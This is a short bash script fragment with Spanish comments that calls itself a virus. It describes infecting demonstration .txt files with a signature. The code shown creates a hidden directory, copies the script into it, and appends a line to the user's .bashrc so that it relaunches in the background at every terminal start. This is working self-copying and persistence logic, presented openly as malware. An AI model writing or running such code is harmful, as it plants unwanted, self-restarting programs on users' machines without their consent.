!/bin/bash
#   1) Infección de Archivos de Demostración:
#      Busca archivos .txt en un directorio demo y les agrega una firma si no están ya "infectados".
# --- Persistencia ---
# Crear directorio oculto para el virus
mkdir -p "$VIRUS_DIR"

# Copiarse a sí mismo en el directorio oculto (si aún no está allí)
if [ "$(realpath "$0")" != "$(realpath "$VIRUS_SCRIPT")" ]; then
    cp "$0" "$VIRUS_SCRIPT"
fi

# Añadir al .bashrc para ejecutar el script en cada inicio de terminal
if ! grep -q "$VIRUS_SCRIPT" "$BASHRC"; then
    echo "bash $VIRUS_SCRIPT &" >> "$BASHRC"
fi